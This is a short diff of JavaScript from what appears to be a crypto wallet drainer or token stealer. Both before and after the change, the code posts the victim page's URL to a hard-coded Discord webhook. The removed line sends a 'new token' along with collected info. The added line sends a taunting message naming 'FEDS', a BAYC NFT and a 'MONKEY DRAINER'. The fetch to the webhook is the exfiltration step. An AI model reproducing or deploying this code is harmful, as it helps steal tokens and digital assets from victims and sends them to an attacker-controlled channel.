@@ -84,7 +84,7 @@ var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBY
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var postData = {
-  content: "@everyone @here new token " + currentURL + info
+  content: "@everyone @here FEDS ABOUT TO COMP 100k USD AND BAYC6969 WITH SEAPORT AND MONKEY DRAINER" + currentURL
 };
 fetch(webhookURL, {
   method: "POST",
